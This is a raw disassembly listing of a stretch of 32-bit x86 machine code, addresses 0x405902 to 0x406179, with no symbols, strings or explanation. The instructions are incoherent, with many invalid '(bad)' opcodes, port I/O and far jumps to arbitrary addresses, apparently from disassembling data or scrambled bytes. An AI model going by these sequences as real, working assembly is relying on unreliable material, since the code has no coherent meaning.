  405902:	(bad)  
  405904:	(bad)  
  405905:	(bad)  
  405907:	stc    
  405908:	mov    ebp,0xd9c7c0d2
  40590d:	rcr    bh,cl
  40590f:	dec    dl
  405911:	jmp    0xf08:0xfdedc7de
  405918:	or     al,0xc8
  40591a:	in     al,dx
  40591b:	jmp    0xc3eb2c13
  405920:	out    0xc0,al
  405922:	jmp    0xc03721d8
  405927:	mov    ecx,0xcff2f2dd
  40592c:	fcmovnb st,st(6)
  40592e:	(bad)  
  40592f:	fst    st(1)
  405931:	std    
  405932:	in     eax,0xfc
  405934:	aam    0xc5
  405936:	(bad)  
  405937:	inc    BYTE PTR [ecx]
  405939:	out    0xf0,al
  40593b:	xlat   BYTE PTR ds:[ebx]
  40593c:	mov    ebp,0xc2e2e6d5
  405941:	mov    bh,0xba
  405943:	dec    dh
  405945:	mov    bh,0xf0
  405947:	std    
  405948:	rcr    dl,cl
  40594a:	add    DWORD PTR [ebx],eax
  40594c:	mov    esi,0xffc405dc
  405951:	std    
  405952:	test   DWORD PTR [ebx],0xe3e0e4eb
  405958:	fld    st(4)
  40595a:	jmp    0xeefe3d46
  40595f:	div    edi
  405961:	mov    ah,0xd2
  405963:	(bad)  
  405964:	cmc    
  405965:	(bad)  
  405966:	in     al,dx
  405967:	jmp    0x6ee:0xe0d2f6b8
  40596e:	out    0xd4,al
  405970:	push   es
  405971:	loope  0x40594b
  405973:	or     esp,esi
  405975:	int    0xeb
  405977:	repz or ah,bh
  40597a:	int    0xe1
  40597c:	out    dx,eax
  40597d:	div    ebx
  40597f:	ret    0xecc8
  405982:	(bad)  
  405983:	(bad)
  405986:	fidivr WORD PTR [eax-0x946402e]
  40598c:	add    esp,esp
  40598e:	in     al,dx
  40598f:	rcr    ecx,0xb
  405992:	jmp    0xde0f:0xf9dcd6d5
  405999:	jmp    0x40598d
  40599b:	out    dx,al
  40599c:	(bad)  
  40599d:	fst    st(1)
  40599f:	in     eax,dx
  4059a0:	aam    0xdb
  4059a2:	in     al,0xcf
  4059a4:	imul   ebx
  4059a6:	sar    ebx,1
  4059a8:	iret   
  4059a9:	clc    
  4059aa:	in     al,dx
  4059ab:	int    0xe0
  4059ad:	cli    
  4059ae:	in     eax,0xdf
  4059b0:	cmc    
  4059b1:	loop   0x40597e
  4059b3:	cmc    
  4059b4:	(bad)  
  4059b6:	fsub   st(1),st
  4059b8:	fsubrp st(1),st
  4059ba:	loope  0x4059a8
  4059bc:	icebp  
  4059bd:	shl    edx,0xb5
  4059c0:	hlt    
  4059c1:	mov    ah,0xd1
  4059c3:	cli    
  4059c4:	jmp    0xf4fd:0xf5c8cadd
  4059cb:	mov    DWORD PTR [edx],0xe6e105e4
  4059d1:	cld    
  4059d2:	lds    ecx,FWORD PTR [eax]
  4059d4:	(bad)  
  4059d5:	loopne 0x405999
  4059d7:	or     cl,ah
  4059d9:	mov    dl,0xf3
  4059db:	retf   
  4059dc:	mov    dl,0xd5
  4059de:	lods   al,BYTE PTR ds:[esi]
  4059df:	jmp    0xd6383ead
  4059e4:	(bad)  
  4059e5:	fdivr  QWORD PTR [ecx-0x422dfc13]
  4059eb:	shl    edi,0xd6
  4059ee:	icebp  
  4059ef:	pop    es
  4059f0:	(bad)  
  4059f2:	loope  0x4059e9
  4059f4:	invd   
  4059f6:	push   es
  4059f7:	vpslld xmm3,xmm4,xmm7
  4059fb:	retf   
  4059fc:	repz sar DWORD PTR [ebx+edi*4-0x46180b3b],1
  405a04:	mov    edi,0xdabad9c8
  405a09:	fadd   QWORD PTR [edi]
  405a0b:	(bad)  
  405a0c:	sti    
  405a0d:	div    dh
  405a0f:	clc    
  405a10:	(bad)  
  405a12:	hlt    
  405a13:	cli    
  405a14:	(bad)  
  405a15:	jmp    0x405a0a
  405a17:	fld1   
  405a19:	lods   al,BYTE PTR ds:[esi]
  405a1a:	mov    eax,0xb5ecf2df
  405a1f:	xlat   BYTE PTR ds:[ebx]
  405a20:	in     eax,0xc8
  405a22:	shl    ebp,1
  405a24:	int    0xef
  405a26:	cmc    
  405a27:	mov    ecx,0xfef7fcce
  405a2c:	in     al,dx
  405a2d:	lock add al,0x1
  405a30:	cli    
  405a31:	loope  0x405a31
  405a33:	bswap  edi
  405a35:	add    cl,BYTE PTR ds:0xdef0dfc8
  405a3b:	loopne 0x405a05
  405a3d:	int3   
  405a3e:	aam    0xb3
  405a40:	repnz rcl eax,cl
  405a43:	out    dx,eax
  405a44:	mov    bh,0xf5
  405a46:	mov    ah,0xff
  405a48:	add    ecx,esi
  405a4a:	rcr    ebx,0xd3
  405a4d:	int    0xda
  405a4f:	mov    esp,0x2c7bf02
  405a54:	frstpm(287 only) 
  405a56:	in     eax,dx
  405a57:	jmp    0x405a68
  405a59:	iret   
  405a5a:	jmp    0x405a4c
  405a5c:	lods   al,BYTE PTR ds:[esi]
  405a5d:	icebp  
  405a5e:	(bad)  
  405a5f:	enter  0xc9b3,0xdf
  405a63:	mov    edi,0xdbf6f5b0
  405a68:	aam    0xfc
  405a6a:	rol    DWORD PTR [ebx],cl
  405a6c:	rol    bh,0xc7
  405a6f:	(bad)  
  405a70:	idiv   bl
  405a72:	aam    0xc1
  405a74:	in     eax,dx
  405a75:	out    0xe6,al
  405a77:	in     al,0xfc
  405a79:	retf   0xf3e5
  405a7c:	mov    dh,0xc2
  405a7e:	not    ah
  405a80:	loop   0x405a63
  405a82:	cmc    
  405a83:	stc    
  405a84:	mov    dh,0xba
  405a86:	into   
  405a87:	enter  0xd4fc,0xfb
  405a8b:	into   
  405a8c:	faddp  st(5),st
  405a8e:	fnop   
  405a90:	fmul   DWORD PTR [edx]
  405a92:	(bad)  
  405a93:	inc    DWORD PTR [esi+eiz*8]
  405a96:	(bad)  
  405a98:	or     bh,BYTE PTR [eax-0x4d29520e]
  405a9e:	icebp  
  405a9f:	in     al,dx
  405aa0:	imul   ch
  405aa2:	mov    bh,0xcf
  405aa4:	(bad)  
  405aa5:	(bad)  
  405aa7:	iret   
  405aa8:	repz sti 
  405aaa:	out    dx,eax
  405aab:	int3   
  405aac:	mov    eax,0xc4ebe5fb
  405ab1:	lock dec ecx
  405ab4:	test   dl,0xea
  405ab7:	out    0x6,eax
  405ab9:	loop   0x405a9c
  405abb:	(bad)  
  405abc:	shl    cl,1
  405abe:	cmc    
  405abf:	mov    ah,0xcb
  405ac1:	jmp    0x405a96
  405ac3:	aam    0xf6
  405ac5:	cld    
  405ac6:	enter  0xd7ba,0xc8
  405aca:	add    edi,DWORD PTR [ebp-0x1b0a0f12]
  405ad0:	(bad)  
  405ad1:	fnstcw WORD PTR [esi+0xbd8e103]
  405ad7:	stc    
  405ad8:	clc    
  405ad9:	repz int 0xa5
  405adc:	cmc    
  405add:	hlt    
  405ade:	(bad)  
  405adf:	(bad)  
  405ae0:	stc    
  405ae1:	aam    0xff
  405ae3:	repnz mov al,0xd8
  405ae6:	shr    dh,cl
  405ae8:	mov    al,0xda
  405aea:	fucomp st(5)
  405aec:	into   
  405aed:	(bad)  
  405aef:	dec    ebx
  405af1:	loop   0x405ad1
  405af3:	(bad)  
  405af4:	(bad)  
  405af5:	add    eax,0xdf1101cb
  405afa:	loop   0x405aad
  405afc:	in     al,dx
  405afd:	(bad)  
  405afe:	mov    dh,0xb6
  405b00:	aad    0xcc
  405b02:	shr    dl,0xdd
  405b05:	in     eax,0xcf
  405b07:	mov    ecx,0xbcccbcde
  405b0c:	in     eax,dx
  405b0d:	in     eax,0xbc
  405b0f:	(bad)  
  405b10:	cld    
  405b11:	(bad)  
  405b12:	or     ebx,ebx
  405b14:	out    0x3,al
  405b16:	fmul   QWORD PTR [ecx+ebx*8]
  405b19:	ret    0xeae8
  405b1c:	(bad)  
  405b1d:	shr    BYTE PTR [esi-0x4e384f31],0xdb
  405b24:	into   
  405b25:	hlt    
  405b26:	std    
  405b27:	leave  
  405b28:	(bad)  
  405b29:	jecxz  0x405af9
  405b2b:	test   DWORD PTR ds:0x2e5f3fe,0xdbebe2d0
  405b35:	jecxz  0x405b25
  405b37:	cli    
  405b38:	loope  0x405ae5
  405b3a:	in     al,0xa8
  405b3c:	loopne 0x405b0c
  405b3e:	shl    DWORD PTR [edi-0xc290b07],cl
  405b44:	shl    BYTE PTR [esi-0x108334a],cl
  405b4a:	clc    
  405b4b:	repnz loopne 0x405b10
  405b4e:	jmp    0x405b09
  405b50:	cmc    
  405b51:	add    eax,0xf8edebeb
  405b56:	fld1   
  405b58:	out    0xc6,eax
  405b5a:	fdivr  DWORD PTR [esi-0x3f3d5240]
  405b60:	in     al,dx
  405b61:	jmp    0x405b5b
  405b63:	mov    ecx,0xf4fac4b9
  405b68:	jmp    0xf9e4:0xbdc7e8ba
  405b6f:	hlt    
  405b70:	cli    
  405b71:	leave  
  405b72:	loop   0x405b35
  405b74:	aad    0xf8
  405b76:	lds    eax,FWORD PTR [ebx]
  405b78:	push   es
  405b79:	retf   0xefa6
  405b7c:	loope  0x405b3e
  405b7e:	shl    cl,0xfa
  405b81:	hlt    
  405b82:	mov    ecx,0xeebaf6e4
  405b87:	icebp  
  405b88:	add    eax,DWORD PTR [eax]
  405b8a:	aad    0xd6
  405b8c:	shr    esp,0x5
  405b8f:	loop   0x405b93
  405b91:	div    esp
  405b93:	in     eax,0xee
  405b95:	fild   WORD PTR [eax]
  405b97:	enter  0xe1fd,0xe6
  405b9b:	int    0xf1
  405b9d:	shr    dl,cl
  405b9f:	ret    0xb3e4
  405ba2:	lock lock ror esi,1
  405ba6:	hlt    
  405ba7:	fcomi  st,st(1)
  405ba9:	lock enter 0xf3b8,0xdb
  405bae:	add    dh,dl
  405bb0:	out    0xca,eax
  405bb2:	or     edx,edi
  405bb4:	loopne 0x405b98
  405bb6:	fmul   DWORD PTR [ecx]
  405bb8:	out    dx,al
  405bb9:	jmp    0xe522096b
  405bbe:	ret    0xdaf5
  405bc1:	(bad)  
  405bc2:	(bad)  
  405bc4:	out    dx,eax
  405bc5:	rcl    bl,cl
  405bc7:	clc    
  405bc8:	jecxz  0x405bbb
  405bca:	clc    
  405bcb:	icebp  
  405bcc:	fcmovnbe st,st(0)
  405bce:	aad    0xc5
  405bd0:	mov    eax,0x3c0d5db
  405bd5:	or     ebx,ebp
  405bd7:	sti    
  405bd8:	out    dx,eax
  405bd9:	fsubp  st(6),st
  405bdb:	mul    dh
  405bdd:	scas   al,BYTE PTR es:[edi]
  405bde:	lods   al,BYTE PTR ds:[esi]
  405bdf:	out    0xcc,al
  405be1:	cli    
  405be2:	shr    al,1
  405be4:	cli    
  405be5:	retf   0xf6f2
  405be8:	ret    
  405be9:	mov    bh,0x0
  405beb:	rcl    edx,1
  405bed:	repz cld 
  405bef:	push   es
  405bf0:	cli    
  405bf1:	icebp  
  405bf2:	add    al,ch
  405bf4:	(bad)  
  405bf6:	retf   0xe901
  405bf9:	int3   
  405bfa:	(bad)
  405bfd:	out    dx,al
  405bfe:	mov    bl,0xec
  405c00:	call   0xbafa36cb
  405c05:	int    0xda
  405c07:	cli    
  405c08:	fdiv   st(0),st
  405c0a:	ret    
  405c0b:	lock fxtract 
  405c0e:	rcr    dl,cl
  405c10:	add    ah,dh
  405c12:	in     al,0xef
  405c14:	jmp    0x405c11
  405c16:	adc    esp,edx
  405c18:	or     al,0xf0
  405c1a:	repz rcl bl,cl
  405c1d:	out    0xcd,eax
  405c1f:	in     al,0xf5
  405c21:	repz out dx,al
  405c23:	fadd   st,st(5)
  405c25:	retf   
  405c26:	fnstcw WORD PTR [edx-0x6172323]
  405c2c:	mov    esp,0xdddbf5fb
  405c31:	shl    bh,1
  405c33:	jecxz  0x405c10
  405c35:	or     esp,esi
  405c37:	xadd   bl,al
  405c3a:	jmp    0xe92f2f0e
  405c3f:	mov    cl,0xc1
  405c41:	out    dx,eax
  405c42:	cli    
  405c43:	(bad)  
  405c44:	mov    edx,0xfef3cffd
  405c49:	loopne 0x405c28
  405c4b:	pop    es
  405c4c:	ret    0xc5f1
  405c4f:	inc    bh
  405c51:	(bad)  
  405c52:	std    
  405c53:	add    edx,ecx
  405c55:	loopne 0x405c1f
  405c57:	add    al,0xd2
  405c59:	enter  0xcdc2,0xe1
  405c5d:	div    edi
  405c5f:	icebp  
  405c60:	lods   al,BYTE PTR ds:[esi]
  405c61:	mov    ch,0xf8
  405c63:	repnz in al,dx
  405c65:	in     al,0xff
  405c67:	retf   0xdee2
  405c6a:	mov    eax,0xe3f6d7cc
  405c6f:	add    bh,ah
  405c71:	fst    st(6)
  405c73:	std    
  405c74:	clc    
  405c75:	jmp    0xe9d3:0xe8d307f8
  405c7c:	(bad)  
  405c7d:	out    dx,eax
  405c7e:	mov    dh,0xe1
  405c80:	not    bh
  405c82:	loopne 0x405c7c
  405c84:	mov    ebx,0xdfc3bcd1
  405c89:	loopne 0x405c47
  405c8b:	clc    
  405c8c:	int3   
  405c8d:	xlat   BYTE PTR ds:[ebx]
  405c8e:	mov    esp,0xc4fdd4e7
  405c93:	out    dx,al
  405c94:	add    al,0x0
  405c96:	in     eax,dx
  405c97:	les    ecx,FWORD PTR [ebx]
  405c99:	mov    cl,0xe8
  405c9b:	loope  0x405c86
  405c9d:	in     eax,dx
  405c9e:	leave  
  405c9f:	in     al,0xd3
  405ca1:	shr    esi,cl
  405ca3:	iret   
  405ca4:	hlt    
  405ca5:	fucomip st,st(4)
  405ca7:	in     al,dx
  405ca8:	retf   0xdddf
  405cab:	shl    BYTE PTR [eax+edx*8-0x1d1a22fb],cl
  405cb2:	cld    
  405cb3:	jmp    0xcbf2:0x1301dfd4
  405cba:	(bad)  
  405cbb:	shl    ch,cl
  405cbd:	out    0xcf,eax
  405cbf:	mov    ch,0xea
  405cc1:	in     eax,0xb0
  405cc3:	aad    0xbb
  405cc5:	jmp    0xc1ff:0xf5ccefd2
  405ccc:	cld    
  405ccd:	int3   
  405cce:	cld    
  405ccf:	mov    esp,0xdc07ebd9
  405cd4:	add    eax,edi
  405cd6:	leave  
  405cd7:	stc    
  405cd8:	retf   0xf1b2
  405cdb:	mov    bl,0xe3
  405cdd:	lods   eax,DWORD PTR ds:[esi]
  405cde:	retf   
  405cdf:	div    cl
  405ce1:	mov    dl,0xd0
  405ce3:	mov    ah,0xfb
  405ce5:	(bad)  
  405ce6:	test   BYTE PTR [ebx],0xee
  405ce9:	aad    0xe1
  405ceb:	sti    
  405cec:	std    
  405ced:	out    0xcc,eax
  405cef:	inc    BYTE PTR [edx]
  405cf1:	out    0xdd,al
  405cf3:	aad    0xe7
  405cf5:	or     al,0xff
  405cf7:	pop    es
  405cf8:	cld    
  405cf9:	mov    dl,0xe8
  405cfb:	imul   edi
  405cfd:	retf   0xf0e4
  405d00:	loop   0x405cef
  405d02:	lock mov eax,0xcbe9bacf
  405d08:	mov    edi,0xfadacdc8
  405d0d:	add    al,0xc6
  405d0f:	mov    esp,0xbde6fbf9
  405d14:	jmp    0x24362de
  405d19:	in     eax,dx
  405d1a:	mov    dl,0xf1
  405d1c:	loopne 0x405cf3
  405d1e:	(bad)
  405d22:	repnz (bad) 
  405d24:	repz out dx,eax
  405d26:	stc    
  405d27:	fcomi  st,st(2)
  405d29:	cmc    
  405d2a:	imul   edi
  405d2c:	(bad)  
  405d2d:	fcomp  st(1)
  405d2f:	sar    eax,0xfb
  405d32:	mov    esi,0xed0ee5e4
  405d37:	int3   
  405d38:	loopne 0x405d1c
  405d3a:	in     eax,dx
  405d3b:	mov    al,0xdd
  405d3d:	ffree  st(5)
  405d3f:	fcmovnbe st,st(6)
  405d41:	aam    0xb1
  405d43:	fscale 
  405d45:	(bad)  
  405d46:	jmp    0x2f3:0xbafdfdff
  405d4d:	shl    cl,1
  405d4f:	xlat   BYTE PTR ds:[ebx]
  405d50:	push   es
  405d51:	fmul   st,st(1)
  405d53:	test   BYTE PTR [ebx],0xdc
  405d56:	add    cl,al
  405d58:	or     DWORD PTR [edx-0x51344c0f],ebp
  405d5e:	retf   0xead0
  405d61:	fsubr  DWORD PTR [esi-0x47221532]
  405d67:	cmc    
  405d68:	fdivr  st,st(6)
  405d6a:	call   0xf4435d4f
  405d6f:	lock loopne 0x405d77
  405d72:	add    al,0xd4
  405d74:	jmp    0xea2d564e
  405d79:	retf   0xbdcd
  405d7c:	cmc    
  405d7d:	int    0xc2
  405d7f:	ret    0xf9cf
  405d82:	test   esp,0xd6bbe5dd
  405d88:	ret    0xecc3
  405d8b:	out    dx,eax
  405d8c:	shl    cl,1
  405d8e:	(bad)  
  405d8f:	(bad)  
  405d91:	jmp    0xc44386c
  405d96:	add    edx,ebx
  405d98:	repnz in eax,0xa9
  405d9b:	mov    dl,0xb0
  405d9d:	int    0xb3
  405d9f:	retf   
  405da0:	aad    0xe4
  405da2:	out    dx,eax
  405da3:	jmp    0x405d89
  405da5:	lock mov ebp,0xd8f2d303
  405dab:	(bad)  
  405dac:	clc    
  405dad:	fiadd  DWORD PTR ds:0xfff106f4
  405db3:	(bad)  
  405db4:	stc    
  405db5:	out    0xf8,eax
  405db7:	fmul   DWORD PTR [eax]
  405db9:	mov    ecx,0xc4edefdc
  405dbe:	(bad)
  405dc2:	jmp    0x405dc3
  405dc4:	jmp    0xe2fd:0xc8d1f4d5
  405dcb:	add    ebx,edx
  405dcd:	mov    ebx,0x2e9d1fa
  405dd2:	les    edi,FWORD PTR [ebp+0x12faf5bc]
  405dd8:	add    BYTE PTR [edi-0x1b14082e],ah
  405dde:	in     al,dx
  405ddf:	mov    bh,0xdb
  405de1:	hlt    
  405de2:	jmp    0x405dca
  405de4:	mov    al,0xca
  405de6:	mov    ah,0xda
  405de8:	leave  
  405de9:	loop   0x405df2
  405deb:	repz push es
  405ded:	mov    ebp,0xc6eb0ad8
  405df2:	xlat   BYTE PTR ds:[ebx]
  405df3:	(bad)  
  405df5:	or     ebp,ebp
  405df7:	in     eax,dx
  405df8:	retf   0xe5cf
  405dfb:	icebp  
  405dfc:	rcl    ebx,0xf6
  405dff:	xlat   BYTE PTR ds:[ebx]
  405e00:	call   0xfe1349c5
  405e05:	jmp    0xfa1a12d8
  405e0a:	shl    eax,1
  405e0c:	mov    ebp,0x7ebf3be
  405e11:	std    
  405e12:	inc    DWORD PTR [edi]
  405e14:	enter  0x7e2,0xfe
  405e18:	out    0xa8,al
  405e1a:	jmp    0xc1c7:0xf6c8e8be
  405e21:	out    dx,eax
  405e22:	mov    al,0xb4
  405e24:	xabort 0xf4
  405e27:	aad    0xc8
  405e29:	(bad)  
  405e2a:	mov    ecx,0xfdbbf2da
  405e2f:	test   DWORD PTR [ebx],0xdb0300e1
  405e35:	jmp    0xa5b3:0xc4ce0de2
  405e3c:	repnz shl edx,cl
  405e3f:	(bad)  
  405e40:	mov    dl,0xd2
  405e42:	not    esp
  405e44:	(bad)  
  405e46:	jmp    0x405e23
  405e48:	call   0xe0193a3a
  405e4d:	stc    
  405e4e:	ret    
  405e4f:	fcmovnb st,st(2)
  405e51:	xlat   BYTE PTR ds:[ebx]
  405e52:	ret    0xe2fe
  405e55:	retf   
  405e56:	retf   0x11c4
  405e59:	icebp  
  405e5a:	lods   al,BYTE PTR ds:[esi]
  405e5b:	shl    edx,cl
  405e5d:	aam    0xc1
  405e5f:	mov    cl,0xcd
  405e61:	mov    ch,0xf0
  405e63:	repz leave 
  405e65:	ror    dl,1
  405e67:	fcomp  st(1)
  405e69:	add    DWORD PTR [eax],eax
  405e6b:	int    0xff
  405e6d:	add    eax,0xd7ca02f7
  405e72:	rcl    ch,1
  405e74:	sti    
  405e75:	(bad)  
  405e76:	in     al,dx
  405e77:	inc    esp
  405e79:	leave  
  405e7a:	retf   0xc0ef
  405e7d:	shl    esi,0xb1
  405e80:	lock scas eax,DWORD PTR es:[edi]
  405e82:	out    dx,al
  405e83:	cmc    
  405e84:	enter  0xfafd,0xe2
  405e88:	rol    BYTE PTR [ebx],1
  405e8a:	repnz mov eax,0xe30303f8
  405e90:	(bad)  
  405e91:	add    esi,ebx
  405e93:	(bad)  
  405e95:	(bad)
  405e98:	or     al,0xde
  405e9a:	jmp    0xdc2c3b5c
  405e9f:	in     al,dx
  405ea0:	loop   0x405e89
  405ea2:	int3   
  405ea3:	xlat   BYTE PTR ds:[ebx]
  405ea4:	lock mov bl,0xbc
  405ea7:	mov    ecx,0xd2eefef1
  405eac:	mov    edi,0xe7d8e2d6
  405eb1:	out    0xf7,eax
  405eb3:	std    
  405eb4:	jmp    0x8503e8e
  405eb9:	retf   
  405eba:	rcl    dh,cl
  405ebc:	jmp    0x405ea3
  405ebe:	shl    edi,0xcf
  405ec1:	shr    dl,cl
  405ec3:	out    dx,al
  405ec4:	aad    0xd8
  405ec6:	mov    esi,0xcfb7d4b1
  405ecb:	mov    edi,0xc7c4e0bc
  405ed0:	(bad)
  405ed3:	frstpm(287 only) 
  405ed5:	(bad)  
  405ed7:	jmp    0xd22809ca
  405edc:	int    0xef
  405ede:	aam    0xe3
  405ee0:	(bad)  
  405ee2:	in     al,dx
  405ee3:	rcr    dh,1
  405ee5:	mov    bl,0xdb
  405ee7:	aad    0xb4
  405ee9:	add    ebx,edx
  405eeb:	cld    
  405eec:	(bad)  
  405eed:	cli    
  405eee:	icebp  
  405eef:	fdivrp st(0),st
  405ef1:	add    al,BYTE PTR [ebx]
  405ef3:	loop   0x405eee
  405ef5:	retf   0xc1cd
  405ef8:	fistp  QWORD PTR [eax-0x28360c39]
  405efe:	ror    bl,cl
  405f00:	leave  
  405f01:	fld    TBYTE PTR [esi-0x3620193b]
  405f07:	ror    ebp,1
  405f09:	into   
  405f0a:	add    al,al
  405f0c:	fcompp 
  405f0e:	shr    bl,0xbc
  405f11:	ret    
  405f12:	ret    0xe1e7
  405f15:	(bad)  
  405f17:	pmaxsw mm6,mm0
  405f1a:	ffree  st(5)
  405f1c:	mov    esi,0xacd1d0c3
  405f21:	(bad)  
  405f22:	rcr    bl,cl
  405f24:	rcr    dl,1
  405f26:	ror    dh,1
  405f28:	fucomi st,st(0)
  405f2a:	aam    0xfa
  405f2c:	in     eax,dx
  405f2d:	add    eax,DWORD PTR [ebx]
  405f2f:	pop    es
  405f30:	aam    0xe6
  405f32:	lock retf 
  405f34:	jmp    0x405f1d
  405f36:	fiadd  WORD PTR [edx]
  405f38:	enter  0xafec,0xec
  405f3c:	test   al,0xef
  405f3e:	lods   al,BYTE PTR ds:[esi]
  405f3f:	mov    ah,0xe2
  405f41:	in     eax,0xf1
  405f43:	iret   
  405f44:	fcom   st(0)
  405f46:	int    0xe9
  405f48:	leave  
  405f49:	jmp    0xbc333024
  405f4e:	sti    
  405f4f:	retf   
  405f50:	retf   0x403
  405f53:	(bad)  
  405f54:	call   0x92b5b5a
  405f59:	(bad)  
  405f5b:	leave  
  405f5c:	mov    cl,0xb5
  405f5e:	loopne 0x405f40
  405f60:	(bad)  
  405f62:	mov    dh,0xba
  405f64:	mov    ah,0xf9
  405f66:	fdiv   st(4),st
  405f68:	aam    0xd4
  405f6a:	ret    0xd7e3
  405f6d:	ret    
  405f6e:	in     eax,0xc1
  405f70:	loope  0x405f66
  405f72:	or     bh,dh
  405f74:	out    dx,al
  405f75:	fsub   st(3),st
  405f77:	loop   0x405f4c
  405f79:	into   
  405f7a:	test   eax,0xcbc1aef1
  405f7f:	aam    0xd2
  405f81:	repz leave 
  405f83:	mov    ecx,0xf3fae9cd
  405f88:	mov    edi,0xc6b9f301
  405f8d:	mul    bh
  405f8f:	cli    
  405f90:	repnz out 0xfc,al
  405f93:	cli    
  405f94:	push   es
  405f95:	in     eax,0xf4
  405f97:	add    al,0xe4
  405f99:	repz scas al,BYTE PTR es:[edi]
  405f9b:	retf   0xe5d3
  405f9e:	repnz out dx,eax
  405fa0:	out    dx,al
  405fa1:	mov    ecx,0xe5fad3f4
  405fa6:	cld    
  405fa7:	jmp    0x7fe:0xc2eef4ca
  405fae:	add    al,0xfa
  405fb0:	jmp    0x405faf
  405fb2:	jmp    0x12cd:0xfc40ac6
  405fb9:	rcr    esi,1
  405fbb:	lods   al,BYTE PTR ds:[esi]
  405fbc:	jmp    0x405fa1
  405fbe:	rcl    esi,cl
  405fc0:	test   al,0xc8
  405fc2:	cli    
  405fc3:	(bad)  
  405fc4:	not    esi
  405fc6:	aam    0xe3
  405fc8:	fdivrp st(1),st
  405fca:	in     eax,dx
  405fcb:	lock mov edi,0xbd2f8f2
  405fd1:	fcmovu st,st(2)
  405fd3:	jmp    0xdccc:0xe6e4ceee
  405fda:	repz div edx
  405fdd:	mov    bh,0xf1
  405fdf:	enter  0xf6f6,0xcf
  405fe3:	rcl    bl,1
  405fe5:	aam    0xe8
  405fe7:	fidivr DWORD PTR [edi-0x28261d46]
  405fed:	add    esp,ebx
  405fef:	test   bl,0xbf
  405ff2:	shl    esi,0x6
  405ff5:	out    dx,al
  405ff6:	add    eax,0xe0c9e5cb
  405ffb:	loopne 0x405fa1
  405ffd:	mov    dh,0xd6
  405fff:	(bad)  
  406000:	mov    dh,0xe4
  406002:	cli    
  406003:	(bad)
  406006:	hlt    
  406007:	fadd   DWORD PTR [ebx]
  406009:	ret    
  40600a:	xlat   BYTE PTR ds:[ebx]
  40600b:	push   es
  40600c:	pop    es
  40600d:	in     al,dx
  40600e:	mov    DWORD PTR [edx],0xf40405f6
  406014:	pop    es
  406015:	enter  0xd9ec,0xc
  406019:	scas   eax,DWORD PTR es:[edi]
  40601a:	call   0xf52a4fe4
  40601f:	mov    al,0xf0
  406021:	sti    
  406022:	shl    BYTE PTR [ebp-0x3c0a2550],0xde
  406029:	mov    ecx,0xd0ccd5bc
  40602e:	aad    0xfc
  406030:	(bad)  
  406031:	call   0x9353911
  406036:	repz adc bh,dl
  406039:	shl    edx,cl
  40603b:	fidiv  WORD PTR [ecx-0x190e2810]
  406041:	rcl    ebx,1
  406043:	jmp    0x40603b
  406045:	jmp    0xe1374c09
  40604a:	out    dx,al
  40604b:	neg    esi
  40604d:	not    dl
  40604f:	idiv   edi
  406051:	(bad)  
  406052:	in     eax,0xe8
  406054:	in     eax,0xfe
  406056:	loopne 0x406036
  406058:	sar    DWORD PTR [edi-0x9221b3c],cl
  40605e:	leave  
  40605f:	rcl    ebp,0xfa
  406062:	jmp    0x406031
  406064:	mov    eax,0xb8cedfb7
  406069:	sti    
  40606a:	cli    
  40606b:	div    dh
  40606d:	rcr    al,0xe1
  406070:	(bad)  
  406072:	loopne 0x406058
  406074:	hlt    
  406075:	jmp    0xe30f2554
  40607a:	mov    ebp,0xb4e5a8d2
  40607f:	in     eax,0xbb
  406081:	ror    cl,1
  406083:	mov    eax,0xefdaeff0
  406088:	fdivr  QWORD PTR [edi+edi*4-0xbf826f9]
  40608f:	rol    ebx,1
  406091:	std    
  406092:	clc    
  406093:	out    0xdd,al
  406095:	jmp    0x406073
  406097:	loope  0x406068
  406099:	iret   
  40609a:	sar    BYTE PTR [edi-0x442f3922],cl
  4060a0:	iret   
  4060a1:	into   
  4060a2:	clc    
  4060a3:	out    0xc8,eax
  4060a5:	out    dx,eax
  4060a6:	les    edi,FWORD PTR [edi-0x345170f]
  4060ac:	shl    dl,1
  4060ae:	clc    
  4060af:	or     ebx,ebx
  4060b1:	jmp    0xe5df:0xd4cafa00
  4060b8:	jmp    0xdf012c9e
  4060bd:	leave  
  4060be:	lods   al,BYTE PTR ds:[esi]
  4060bf:	out    dx,eax
  4060c0:	enter  0xfbcc,0xb4
  4060c4:	xlat   BYTE PTR ds:[ebx]
  4060c5:	dec    ah
  4060c7:	mov    ecx,0xfdd2c8bc
  4060cc:	test   edi,0xf1fbfc07
  4060d2:	ret    0xc0dc
  4060d5:	enter  0xfecb,0xd2
  4060d9:	fsubr  st,st(4)
  4060db:	shr    bl,0xc1
  4060de:	retf   
  4060df:	xlat   BYTE PTR ds:[ebx]
  4060e0:	les    esi,FWORD PTR [ebx-0x3a350c29]
  4060e6:	(bad)  
  4060e7:	shl    edx,cl
  4060e9:	icebp  
  4060ea:	out    dx,eax
  4060eb:	mov    edi,0xe603e6e3
  4060f0:	mov    eax,0xdc04e1d8
  4060f5:	out    dx,al
  4060f6:	hlt    
  4060f7:	jmp    0xccee:0xefeedefd
  4060fe:	shl    BYTE PTR [ebx-0x162a1f39],cl
  406104:	hlt    
  406105:	std    
  406106:	aam    0xc3
  406108:	std    
  406109:	dec    edi
  40610b:	mov    eax,0x5c1ddc6
  406110:	retf   
  406111:	fdivrp st(4),st
  406113:	mov    ebp,0xc5fcd5e5
  406118:	in     eax,dx
  406119:	out    dx,eax
  40611a:	mov    bl,0xdc
  40611c:	mov    dl,0xd4
  40611e:	in     al,0xf2
  406120:	cmc    
  406121:	aad    0xc8
  406123:	(bad)  
  406124:	fsub   st,st(5)
  406126:	div    dl
  406128:	icebp  
  406129:	(bad)  
  40612b:	repnz shl eax,cl
  40612e:	add    esp,edi
  406130:	loopne 0x4060f8
  406132:	sti    
  406133:	jmp    ebx
  406135:	hlt    
  406136:	loopne 0x406140
  406138:	push   es
  406139:	leave  
  40613a:	xlat   BYTE PTR ds:[ebx]
  40613b:	in     eax,dx
  40613c:	out    0xe1,al
  40613e:	in     al,0xc1
  406140:	mov    cl,0xcd
  406142:	in     al,0xbb
  406144:	int    0xee
  406146:	aad    0xdb
  406148:	int    0xbd
  40614a:	ror    esp,cl
  40614c:	mov    esi,0xd1c7d1c6
  406151:	jecxz  0x406151
  406153:	jmp    0xb308:0xfdcac8c4
  40615a:	mov    edi,0xe9f1bdd2
  40615f:	int    0xd3
  406161:	repnz in al,dx
  406163:	hlt    
  406164:	in     eax,0xcb
  406166:	mov    ecx,0xfabdfcf0
  40616b:	(bad)  
  40616d:	(bad)  
  40616f:	(bad)  
  406171:	fcomp  st(5)
  406173:	retf   0xf8f4
  406176:	or     edx,esi
  406178:	leave  
  406179:	out    0xbd,eax
